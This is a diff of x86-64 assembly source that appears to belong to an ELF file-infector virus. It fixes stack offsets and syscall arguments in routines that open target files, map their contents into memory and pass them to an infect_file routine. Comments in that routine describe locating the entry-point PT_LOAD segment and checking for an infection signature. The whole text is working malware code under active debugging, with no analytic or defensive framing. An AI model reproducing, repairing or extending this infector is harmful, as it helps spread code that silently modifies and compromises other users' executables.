@@ -157,17 +157,17 @@ copy_file_bytes:
 open_file:
 	mov		BYTE [rsp + rax], 0		; NULL byte the end of the string path
 	sub		rsp, rcx				; Return to the start of the string path
-	sub		rsp, 20					; int fd, size_t size, void *data
-									; [rsp] , [rsp + 4]  , [rsp + 12]
+	sub		rsp, 16					; int fd, size_t size, void *data
+									; [rsp] , [rsp + 4]  , [rsp + 8]
 	mov		DWORD [rsp], -1
 	mov		QWORD [rsp + 4], -1
-	mov		QWORD [rsp + 12], -1
+	mov		QWORD [rsp + 8], -1
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; int	sys_open(file_path, O_RDONLY|O_NONBLOCK, 0)                      ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov		edx, 0x0
 	mov		esi, 0x800
-	lea		rdi, [rsp + 20]
+	lea		rdi, [rsp + 16]
 	mov		rax, SYS_OPEN
 	syscall
 	mov		DWORD [rsp], eax		; store FD in [rsp]
@@ -181,21 +181,22 @@ open_file:
 	mov		edi, eax
 	mov		rax, SYS_LSEEK
 	syscall
-	mov		QWORD [rsp + 4], rax	; store SIZE in [rsp + 4]
+	mov		DWORD [rsp + 4], eax	; store SIZE in [rsp + 4]
 	cmp		rax, 0					; test return value
 	jle		close_file
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; void	*mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	xor		r9d, r9d				; 0
+	mov eax, DWORD [rsp + 4]
+	mov		r9d, 0					; 0
 	mov		r8d, -1					; -1
-	mov		ecx, 0x22				; MAP_PRIVATE | MAP_ANONYMOUS
+	mov		r10d, 0x22				; MAP_PRIVATE | MAP_ANONYMOUS
 	mov		edx, 0x3				; PROT_READ | PROT_WRITE
 	mov		rsi, rax				; size
-	xor		edi, edi				; NULL
+	mov		edi, 0					; NULL
 	mov		rax, SYS_MMAP
 	syscall
-	mov		QWORD [rsp + 12], rax	; store ADDRESS in [RSP + 12]
+	mov		QWORD [rsp + 8], rax	; store ADDRESS in [RSP + 8]
 	cmp		rax, -1					; test if == MAP_FAILED (-1)
 	jle		close_file
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -205,55 +206,56 @@ open_file:
 	mov		esi, 0
 	mov		edi, DWORD [rsp]
 	mov		rax, SYS_LSEEK
+	syscall
 	cmp		rax, 0
 	jl		close_file
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; int	read(fd, buf, 1024)                                              ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	sub		rsp, 1036					; int i, int j, int ret, char buf[1024]
+	sub		rsp, 1040					; int i,     int j, char buf[1024],    int ret
+										; [rsp], [rsp + 4],      [rsp + 8], [rsp + 1032]
 	mov		DWORD [rsp], 0				; i = 0
-	mov		DWORD [rsp + 4], 0
+	mov		DWORD [rsp + 4], 0			; j = 0
 
 read_loop:
 	mov		eax, DWORD [rsp + 4]
 	add		DWORD [rsp], eax			; i += j
 	mov		rdx, 1024
-	lea		rsi, [rsp + 12]				; char buf[1024]
-	mov		edi, DWORD [rsp + 1036]		; file -> fd
+	lea		rsi, [rsp + 8]				; char buf[1024]
+	mov		edi, DWORD [rsp + 1040]		; file -> fd
 	mov		rax, SYS_READ
 	syscall
-	mov		DWORD [rsp + 8], eax		; ret = read(...)
-	cmp		DWORD [rsp + 8], 0
+	mov		DWORD [rsp + 1032], eax		; ret = read(...)
+	cmp		DWORD [rsp + 1032], 0
 	jle		read_loop_end
 	mov		DWORD [rsp + 4], 0			; j = 0
 read_loop_copy:
 	mov		eax, DWORD [rsp + 4]		; j
-	cmp		eax, DWORD [rsp + 8]		; j >= ret
+	cmp		eax, DWORD [rsp + 1032]		; j >= ret
 	jge		read_loop
 	mov		eax, DWORD [rsp + 4]		; j
-	movzx	eax, BYTE [rsp + rax + 12]	; buf[j]
+	movzx	eax, BYTE [rsp + rax + 8]	; buf[j]
 
-	mov		ecx, DWORD [rsp]			; i
-	mov		edx, DWORD [rsp + 4]		; j
-	add		rdx, rcx
-	mov		rdx, QWORD [rsp + rdx + 1048]		; data[i + j]
+	mov		edx, DWORD [rsp]			; i
+	add		edx, DWORD [rsp + 4]		; j
+	add		rdx, QWORD [rsp + 1048]		; void *data + i + j
 	mov		BYTE [rdx], al				; data[i + j] = buf[j]
 	add		DWORD [rsp + 4], 0x1		; j += 1
 	jmp		read_loop_copy
 read_loop_end:
-	add		rsp, 1036
+	add		rsp, 1040
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; int close( fd )                                                       ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	mov		edi, DWORD [rsp]	; int fd
+	mov		edi, DWORD [rsp]			; int fd
 	mov		rax, SYS_CLOSE
 	syscall
 
-	cmp		DWORD [rsp - 1028], 0
+	cmp		DWORD [rsp - 8], 0			; ret != 0
 	jne		close_file
-	mov		rdx, QWORD [rsp + 12]		; void *data
-	mov		rsi, QWORD [rsp + 4]		; int size
-	lea		rdi, [rsp + 20]				; char *path
+	mov		rdx, QWORD [rsp + 8]		; void *data
+	mov		esi, DWORD [rsp + 4]		; int size
+	lea		rdi, [rsp + 16]				; char *path
 	call	infect_file
 close_file:
 	mov		edi, DWORD [rsp]			; int fd
@@ -261,17 +263,17 @@ close_file:
 	syscall
 
 munmap_file:
-	cmp		QWORD [rsp + 20], -1		; void *data
+	cmp		QWORD [rsp + 16], -1		; void *data
 	je		get_dat_elf_end
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; int munmap(data, size)                                                ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	mov		rsi, QWORD [rsp + 4]	; int size
-	mov		rdi, QWORD [rsp + 12]	; void *data
+	mov		esi, DWORD [rsp + 4]	; int size
+	mov		rdi, QWORD [rsp + 8]	; void *data
 	mov		rax, SYS_MUNMAP
 	syscall
 get_dat_elf_end:
-	add		rsp, 1044
+	add		rsp, 1040
 	pop		r11
 	pop		r10
 	pop		r9
@@ -320,8 +322,8 @@ infect_file:
 	push		r11
 	push		r12
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 1. Find the memory mapped PT_LOAD segment that contains entry point
-	;;    R8 will store it.
+	;; 1. Find the memory mapped PT_LOAD segment that contains entry point   ;;
+	;;    R8 will store it.                                                  ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;;    R8  : Program Header table start
 	;;    RCX : Program Header table end
@@ -350,8 +352,8 @@ get_segment:
 	jl		next_segment
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 2. Check if the file is already infected
-	;;    Our code inject a signature at the very end of the file.
+	;; 2. Check if the file is already infected                              ;;
+	;;    Our code inject a signature at the very end of the file.           ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;;    RSI contains the file size
 	;;    RDX contains *data
